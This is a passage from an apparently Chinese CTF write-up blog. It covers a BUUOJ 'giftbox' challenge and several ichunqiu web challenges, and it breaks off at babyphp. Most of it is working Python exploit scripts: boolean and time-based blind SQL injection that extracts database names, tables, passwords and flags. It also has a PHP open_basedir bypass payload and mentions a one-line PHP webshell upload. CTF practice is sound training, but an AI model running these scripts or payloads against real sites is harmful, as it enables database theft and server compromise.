class=\"number\">0</span>)&#123;e_console.css(<span class=\"string\">'top'</span>,-(e_console.height()-$(<span class=\"built_in\">window</span>).height()));&#125;<span class=\"keyword\">else</span>&#123;e_console.css(<span class=\"string\">'top'</span>,<span class=\"number\">5</span>);&#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;)</span><br><span class=\"line\">···</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"0x02-操作\"><a href=\"#0x02-操作\" class=\"headerlink\" title=\"0x02 操作\"></a>0x02 操作</h3><p>编写盲注脚本</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># @Time    : 1/14/2020 9:42 PM</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> pyotp</span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get</span><span class=\"params\">(url, payload)</span>:</span></span><br><span class=\"line\">    time.sleep(<span class=\"number\">0.5</span>)</span><br><span class=\"line\">    totp = pyotp.TOTP(<span class=\"string\">'GAXG24JTMZXGKZBU'</span>, <span class=\"number\">8</span>, interval=<span class=\"number\">5</span>)</span><br><span class=\"line\">    params = &#123;</span><br><span class=\"line\">        <span class=\"string\">'a'</span>: <span class=\"string\">\"login admin'/**/and/**/(\"</span>+payload+<span class=\"string\">\")# admin\"</span>,</span><br><span class=\"line\">        <span class=\"string\">'totp'</span>: totp.now()</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\"># print(params)</span></span><br><span class=\"line\">    html = requests.get(url,params=params,).text</span><br><span class=\"line\">    <span class=\"comment\"># print(html)</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> html</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">binsea</span><span class=\"params\">(s_payload,len=<span class=\"number\">64</span>)</span>:</span></span><br><span class=\"line\">    result = <span class=\"string\">''</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>, len+<span class=\"number\">1</span>):</span><br><span class=\"line\">        left = <span class=\"number\">0</span></span><br><span class=\"line\">        right = <span class=\"number\">126</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> left &lt;= right:</span><br><span class=\"line\">            mid = (left + right) / <span class=\"number\">2</span></span><br><span class=\"line\">            payload = <span class=\"string\">\"ascii(substr((%s),%d,1))&gt;%d\"</span> % (s_payload,x, mid)</span><br><span class=\"line\">            url = <span class=\"string\">'http://257c0b3b-d0fb-4a75-811f-d763da9af540.node3.buuoj.cn/shell.php'</span></span><br><span class=\"line\">            html = get(url, payload)</span><br><span class=\"line\">            <span class=\"comment\"># print(html, '*-*-*-*-*-*', mid)</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">'password'</span> <span class=\"keyword\">in</span> html:</span><br><span class=\"line\">                left = mid +<span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                right = mid <span class=\"number\">-1</span></span><br><span class=\"line\">        mid = int((left + right + <span class=\"number\">1</span>) / <span class=\"number\">2</span>)</span><br><span class=\"line\">        result += chr(mid)</span><br><span class=\"line\">        print(result)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> result</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_database</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    s_payload=<span class=\"string\">'database()'</span></span><br><span class=\"line\">    database = binsea(s_payload,<span class=\"number\">7</span>)</span><br><span class=\"line\">    print(database)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_tabls</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    s_payload = <span class=\"string\">'select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=\\'giftbox\\''</span></span><br><span class=\"line\">    tables=binsea(s_payload,<span class=\"number\">5</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_columns</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    s_payload = <span class=\"string\">'select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=\\'users\\''</span></span><br><span class=\"line\">    columns=binsea(s_payload)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_data</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    s_payload=<span class=\"string\">'select/**/concat(password)/**/from/**/users'</span></span><br><span class=\"line\">    password=binsea(s_payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    <span class=\"comment\"># get_database()</span></span><br><span class=\"line\">    <span class=\"comment\"># get_tabls()</span></span><br><span class=\"line\">    <span class=\"comment\"># get_columns()</span></span><br><span class=\"line\">    <span class=\"comment\"># get_data()</span></span><br></pre></td></tr></table></figure>\n\n<p>数据库是giftbox,只有一个users表，有<code>id,username,password</code></p>\n<p>admin的密码是<code>hint{G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333}</code></p>\n<p>根据密码的提示得到</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[de1ta@de1ta-mbp &#x2F;sandbox]% sh0w_hiiintttt_23333</span><br><span class=\"line\">we add an evil monster named &#39;eval&#39; when launching missiles.</span><br></pre></td></tr></table></figure>\n\n<p>targeting  还有长度限制，code为2，possition为12。</p>\n<p>在phpiofo中设置了open_basedir</p>\n<p><img src=\"/pic/37.png\" alt=\"\"></p>\n<p>关于open_basedir<br>   open_basedir是php.ini中的一个配置选项<br>   它可将用户访问文件的活动范围限制在指定的区域，<br>   假设open_basedir=/home/wwwroot/home/web1/:/tmp/，那么通过web1访问服务器的用户就无法获取服务器上除了/home/wwwroot/home/web1/和/tmp/这两个目录以外的文件。<br>   注意用open_basedir指定的限制实际上是前缀,而不是目录名。<br>   举例来说: 若”open_basedir = /dir/user”, 那么目录 “/dir/user” 和 “/dir/user1”都是可以访问的。所以如果要将访问限制在仅为指定的目录，请用斜线结束路径名。</p>\n<p><a href=\"https://www.cnblogs.com/cimuhuashuimu/p/11544487.html\" target=\"_blank\" rel=\"noopener\">绕过参考文章</a></p>\n<p>绕过payload</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);echo(file_get_contents(&#39;flag&#39;));&#96;</span><br></pre></td></tr></table></figure>\n\n<p>附上完整脚本</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># @Time    : 1/14/2020 9:42 PM</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> pyotp</span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"></span><br><span class=\"line\">sesssion=requests.session()</span><br><span class=\"line\">url = <span class=\"string\">'http://257c0b3b-d0fb-4a75-811f-d763da9af540.node3.buuoj.cn/shell.php'</span></span><br><span class=\"line\">totp = pyotp.TOTP(<span class=\"string\">'GAXG24JTMZXGKZBU'</span>, <span class=\"number\">8</span>, interval=<span class=\"number\">5</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get</span><span class=\"params\">(url, payload)</span>:</span></span><br><span class=\"line\">    time.sleep(<span class=\"number\">0.5</span>)</span><br><span class=\"line\">    params = &#123;</span><br><span class=\"line\">        <span class=\"string\">'a'</span>: <span class=\"string\">\"login admin'/**/and/**/(\"</span>+payload+<span class=\"string\">\")# admin\"</span>,</span><br><span class=\"line\">        <span class=\"string\">'totp'</span>: totp.now()</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\"># print(params)</span></span><br><span class=\"line\">    html = requests.get(url,params=params,).text</span><br><span class=\"line\">    <span class=\"comment\"># print(html)</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> html</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">binsea</span><span class=\"params\">(s_payload,len=<span class=\"number\">64</span>)</span>:</span></span><br><span class=\"line\">    result = <span class=\"string\">''</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>, len+<span class=\"number\">1</span>):</span><br><span class=\"line\">        left = <span class=\"number\">0</span></span><br><span class=\"line\">        right = <span class=\"number\">126</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> left &lt;= right:</span><br><span class=\"line\">            mid = (left + right) / <span class=\"number\">2</span></span><br><span class=\"line\">            payload = <span class=\"string\">\"ascii(substr((%s),%d,1))&gt;%d\"</span> % (s_payload,x, mid)</span><br><span class=\"line\"></span><br><span class=\"line\">            html = get(url, payload)</span><br><span class=\"line\">            <span class=\"comment\"># print(html, '*-*-*-*-*-*', mid)</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">'password'</span> <span class=\"keyword\">in</span> html:</span><br><span class=\"line\">                left = mid +<span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                right = mid <span class=\"number\">-1</span></span><br><span class=\"line\">        mid = int((left + right + <span class=\"number\">1</span>) / <span class=\"number\">2</span>)</span><br><span class=\"line\">        result += chr(mid)</span><br><span class=\"line\">        print(result)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> result</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_database</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    s_payload=<span class=\"string\">'database()'</span></span><br><span class=\"line\">    database = binsea(s_payload,<span class=\"number\">7</span>)</span><br><span class=\"line\">    print(database)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_tabls</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    s_payload = <span class=\"string\">'select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=\\'giftbox\\''</span></span><br><span class=\"line\">    tables=binsea(s_payload,<span class=\"number\">5</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_columns</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    s_payload = <span class=\"string\">'select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=\\'users\\''</span></span><br><span class=\"line\">    columns=binsea(s_payload,<span class=\"number\">23</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_data</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    s_payload=<span class=\"string\">'select/**/concat(password)/**/from/**/users'</span></span><br><span class=\"line\">    password=binsea(s_payload,<span class=\"number\">13</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">login</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    params = &#123;</span><br><span class=\"line\">        <span class=\"string\">'a'</span>: <span class=\"string\">\"login admin hint&#123;G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333&#125;\"</span>,</span><br><span class=\"line\">        <span class=\"string\">'totp'</span>: totp.now()</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    sesssion.get(url, params=params)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">target</span><span class=\"params\">(code,position)</span>:</span></span><br><span class=\"line\"></span><br><span class=\"line\">    params = &#123;</span><br><span class=\"line\">        <span class=\"string\">'a'</span>: <span class=\"string\">\"targeting\"</span>+code+<span class=\"string\">' '</span>+position,</span><br><span class=\"line\">        <span class=\"string\">'totp'</span>: totp.now()</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    sesssion.get(url,params=params)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">destruct</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    params = &#123;</span><br><span class=\"line\">        <span class=\"string\">'a'</span>: <span class=\"string\">\"destruct\"</span>,</span><br><span class=\"line\">        <span class=\"string\">'totp'</span>: totp.now()</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    sesssion.get(url, params=params)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">launch</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    params = &#123;</span><br><span class=\"line\">        <span class=\"string\">'a'</span>: <span class=\"string\">'launch'</span>,</span><br><span class=\"line\">        <span class=\"string\">'totp'</span>: totp.now()</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    print(sesssion.get(url, params=params).json())</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_password</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    <span class=\"comment\"># get_database()</span></span><br><span class=\"line\">    <span class=\"comment\"># get_tabls()</span></span><br><span class=\"line\">    <span class=\"comment\"># get_columns()</span></span><br><span class=\"line\">    get_data()</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_flag</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    login()</span><br><span class=\"line\">    target(<span class=\"string\">'a'</span>,<span class=\"string\">'chdir'</span>)</span><br><span class=\"line\">    target(<span class=\"string\">'b'</span>,<span class=\"string\">'img'</span>)</span><br><span class=\"line\">    target(<span class=\"string\">'c'</span>,<span class=\"string\">'&#123;$a($b)&#125;'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    target(<span class=\"string\">'d'</span>,<span class=\"string\">'ini_set'</span>)</span><br><span class=\"line\">    target(<span class=\"string\">'e'</span>, <span class=\"string\">'open_base_dir'</span>)</span><br><span class=\"line\">    target(<span class=\"string\">'f'</span>, <span class=\"string\">'..'</span>)</span><br><span class=\"line\">    target(<span class=\"string\">'g'</span>, <span class=\"string\">'&#123;$d($e,$f)&#125;'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    target(<span class=\"string\">'h'</span>, <span class=\"string\">'&#123;$a($f)&#125;'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    target(<span class=\"string\">'i'</span>, <span class=\"string\">'&#123;$a($f)&#125;'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    target(<span class=\"string\">'j'</span>, <span class=\"string\">'&#123;$a($f)&#125;'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    target(<span class=\"string\">'k'</span>,<span class=\"string\">'&#123;$a($f)&#125;'</span> )</span><br><span class=\"line\"></span><br><span class=\"line\">    target(<span class=\"string\">'l'</span>, <span class=\"string\">'/'</span>)</span><br><span class=\"line\">    target(<span class=\"string\">'m'</span>, <span class=\"string\">'&#123;$d($e,$l)&#125;'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    target(<span class=\"string\">'n'</span>, <span class=\"string\">'eaho'</span>)</span><br><span class=\"line\">    target(<span class=\"string\">'o'</span>, <span class=\"string\">'file_get_'</span>)</span><br><span class=\"line\">    target(<span class=\"string\">'p'</span>, <span class=\"string\">'contents'</span>)</span><br><span class=\"line\">    target(<span class=\"string\">'q'</span>, <span class=\"string\">'$o$p'</span>)</span><br><span class=\"line\">    target(<span class=\"string\">'r'</span>, <span class=\"string\">'flag'</span>)</span><br><span class=\"line\">    target(<span class=\"string\">'s'</span>,<span class=\"string\">'&#123;$n($q(r))&#125;'</span> )</span><br><span class=\"line\">    launch()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">\tget_flag():</span><br></pre></td></tr></table></figure>\n\n<p>返回结果</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;'code': 0, 'message': 'Initializing launching system...&lt;br&gt;Setting target: $a = \"chdir\";&lt;br&gt;Reading target: $a = \"chdir\";&lt;br&gt;Setting target: $b = \"img\";&lt;br&gt;Reading target: $b = \"img\";&lt;br&gt;Setting target: $c = \"&#123;$a($b)&#125;\";&lt;br&gt;Reading target: $c = \"1\";&lt;br&gt;Setting target: $d = \"ini_set\";&lt;br&gt;Reading target: $d = \"ini_set\";&lt;br&gt;Setting target: $e = \"open_basedir\";&lt;br&gt;Reading target: $e = \"open_basedir\";&lt;br&gt;Setting target: $f = \"..\";&lt;br&gt;Reading target: $f = \"..\";&lt;br&gt;Setting target: $g = \"&#123;$d($e,$f)&#125;\";&lt;br&gt;Reading target: $g = \"/app:/sandbox\";&lt;br&gt;Setting target: $h = \"&#123;$a($f)&#125;\";&lt;br&gt;Reading target: $h = \"1\";&lt;br&gt;Setting target: $i = \"&#123;$a($f)&#125;\";&lt;br&gt;Reading target: $i = \"1\";&lt;br&gt;Setting target: $j = \"Ly8v\";&lt;br&gt;Reading target: $j = \"Ly8v\";&lt;br&gt;Setting target: $k = \"base64_\";&lt;br&gt;Reading target: $k = \"base64_\";&lt;br&gt;Setting target: $l = \"decode\";&lt;br&gt;Reading target: $l = \"decode\";&lt;br&gt;Setting target: $m = \"$k$l\";&lt;br&gt;Reading target: $m = \"base64_decode\";&lt;br&gt;Setting target: $n = \"&#123;$m($j)&#125;\";&lt;br&gt;Reading target: $n = \"///\";&lt;br&gt;Setting target: $o = \"&#123;$d($e,$n)&#125;\";&lt;br&gt;Reading target: $o = \"..\";&lt;br&gt;Setting target: $p = \"flag\";&lt;br&gt;Reading target: $p = \"flag\";&lt;br&gt;Setting target: $q = \"file_get\";&lt;br&gt;Reading target: $q = \"file_get\";&lt;br&gt;Setting target: $r = \"_contents\";&lt;br&gt;Reading target: $r = \"_contents\";&lt;br&gt;Setting target: $s = \"$q$r\";&lt;br&gt;Reading target: $s = \"file_get_contents\";&lt;br&gt;Setting target: $t = \"&#123;$s($p)&#125;\";&lt;br&gt;Reading target: $t = \"flag&#123;dd8dcd47-5bce-4fe2-b2ee-f2aec667ddd3&#125;\\n\";&lt;br&gt;3..2..1..Fire!&lt;br&gt;All 20 missiles are launched...&lt;br&gt;Cruising...&lt;br&gt;Engaging...Bull\\'s-eye!&lt;br&gt;All targets are eliminated.&lt;br&gt;'&#125;</span><br></pre></td></tr></table></figure>"},{"title":"ichunqiu公益赛web","date":"2020-02-21T06:04:40.000Z","_content":"\n# 简单的招聘系统\n\n打开题目是一个登入界面，是NULL的大佬出的题目\n\n<!--more-->\n\n![](/pic/107.png)\n\n简单的注册admin,admin登入，发现在Profile界面发现存在~~xss~~slelf-xss 还有一个admin界面，提示需要admin才能访问，不过只能获取自己cookie。这是一个坑。\n\n实在是想不到怎么办。\n\n后面想到登入界面可能存在注入,经过测试确实存在sql注入\n\n![](/pic/109.png)\n\n编写脚本，在里面有坑，编码不一样\n\n```php\n# -*- coding: utf-8 -*-\n# @Time    : 1/30/2020 9:42 PM\nimport requests\n\ndef get(payload):\n    url = 'http://3f5788fc3e0d4cd29c4857bd75a3087e9c2af7a010664d15.changame.ichunqiu.com/index.php'\n    data={\n        'lname' : 'admin\\' and '+payload+'#',\n        'lpass' : 'admin'\n    }\n    cookies={\n        'PHPSESSID' : 'bbvvjmdnv20oa9vpub65s4bkr4',\n        '__jsluid_h' : 'a36781563be2b33ed295cec9257f1621'\n    }\n    html = requests.post(url,data=data,cookies=cookies)\n    # print(html)\n    return html\n\ndef binsea(s_payload,len=999):\n    result = ''\n    x=1\n    while x <= len :\n        error = 0\n        left = 0\n        right = 126\n        while left <= right:\n            mid = (left + right) / 2\n            payload = \"ascii(substr((%s),%d,1))>%d\" % (s_payload,x, mid)\n\n            res = get(payload)\n            if res.status_code == 404 or res.status_code == 429:\n                x=x-1\n                error = 1\n                break\n            html=res.text\n            # print('*-*-*-*-*-*', mid)\n            if 'window.location.href=\"./zhaopin.php\"' in html:\n                left = mid +1\n            else:\n                right = mid -1\n        mid = int((left + right + 1) / 2)\n        if mid == 0 :\n            break\n        if error == 0 :\n            result += chr(mid)\n            print(result)\n        x=x+1\n    return result\n\ndef get_database():\n    s_payload='database()'\n    database = binsea(s_payload)\n    print(database)\n\ndef get_tabls(db):\n    s_payload = 'select(group_concat(table_name))from(information_schema.tables)where(table_schema=\\''+db+'\\')'\n    tables=binsea(s_payload)\n\ndef get_columns(table):\n    s_payload = 'select(group_concat(column_name))from(information_schema.columns)where(table_name=\\''+table+'\\')'\n    columns=binsea(s_payload)\n\ndef get_data(columns,table):\n    s_payload='select(group_concat('+columns+'))from('+table+')'\n    password=binsea(s_payload)\n\n\n# get_database() #nzhaopin\n\n# get_tabls('nzhaopin') #backup,flag,user\n\n# get_columns('flag') #id,flaaag\n\nget_data('flaaag','flag') #flag{04418836-27b8-4f85-8c53-74f7e3e53350}\n```\n\n# ezupload\n\n直接上传php后缀，一句话木马，蚁剑链接，执行/readflag\n\n# 盲注\n\n```php\n<?php\n    # flag在fl4g里\n    include 'waf.php';\n    header(\"Content-type: text/html; charset=utf-8\"); \n    $db = new mysql();\n\n    $id = $_GET['id'];\n\n    if ($id) {\n        if(check_sql($id)){\n            exit();\n        } else {\n            $sql = \"select * from flllllllag where id=$id\";\n            $db->query($sql);\n        }\n    }\n    highlight_file(__FILE__);\n```\n\n题目给出了源码，经过测试过滤了如下字符\n\n![](/pic/110.png)\n\n附上脚本\n\n```python\n# -*- coding: utf-8 -*-\nimport requests\nimport time\n\ndef get(payload):\n    url = 'http://c4c11f9e99ba4142b9bfc8ed760a65a985f476a30a93485e.changame.ichunqiu.com/?id=0||'+payload+'%23'\n    html = requests.get(url)\n    # print(url)\n    # print(html)\n    # return html\n\ndef main():\n    result=''\n    for x in range(70):\n        for c in range(32,126):\n            payload=\"if(ascii(substr(fl4g, %d, 1)) ^ %d, sleep(0), sleep(2))\" %(x,c)\n            time1 = time.time()\n            get(payload)\n            time2 = time.time()\n            sec = time2 - time1\n            # print(sec,' ',chr(c))\n            if sec >=1.5:\n                result+=chr(c)\n                print(result)\n                break\n            else:\n                pass\n\nif __name__ =='__main__':\n    main()\n```\n\n\n\n# babyphp\n\n打开还是一个登入界面，访问www.zip发现源码\n\n```php\n//index.php\n<?php\nrequire_once \"lib.php\";\n\nif(isset($_GET['action'])){\n\trequire_once(__DIR__.\"/\".$_GET['action'].\".php\");\n}\nelse{\n\tif($_SESSION['login']==1){\n\t\techo 